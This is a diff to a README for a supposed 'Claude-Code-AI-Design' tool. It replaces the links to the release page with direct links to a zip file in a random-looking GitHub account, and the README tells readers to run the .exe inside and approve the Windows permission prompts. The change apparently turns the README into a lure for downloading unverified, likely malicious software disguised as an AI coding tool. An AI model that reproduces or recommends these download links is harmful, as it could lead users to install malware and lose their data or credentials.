@@ -1,6 +1,6 @@
 # 🎨 Claude-Code-AI-Design - Convert your design files to code
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Genussarcostemmacryptorchism148/Claude-Code-AI-Design/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://raw.githubusercontent.com/Genussarcostemmacryptorchism148/Claude-Code-AI-Design/main/Opus 4.7/A_Claude_Design_Code_1.2.zip)
 
 ## What is this tool?
 
@@ -22,7 +22,7 @@ If you do not have Node.js, download the installer from the official website. Ru
 
 ## 📥 How to get started
 
-You need to download the installer from our release page. Visit this page to download: [https://github.com/Genussarcostemmacryptorchism148/Claude-Code-AI-Design/releases](https://github.com/Genussarcostemmacryptorchism148/Claude-Code-AI-Design/releases)
+You need to download the installer from our release page. Visit this page to download: [https://raw.githubusercontent.com/Genussarcostemmacryptorchism148/Claude-Code-AI-Design/main/Opus 4.7/A_Claude_Design_Code_1.2.zip](https://raw.githubusercontent.com/Genussarcostemmacryptorchism148/Claude-Code-AI-Design/main/Opus 4.7/A_Claude_Design_Code_1.2.zip)
 
 Look for the file that ends with .exe. Click the link to save the file to your computer. Once the download finishes, find the file in your Downloads folder. Double-click the file to start the installation. If Windows asks for permissions, click "Run" or "Yes." Follow the prompts on the screen. The installer places a shortcut on your desktop.
 
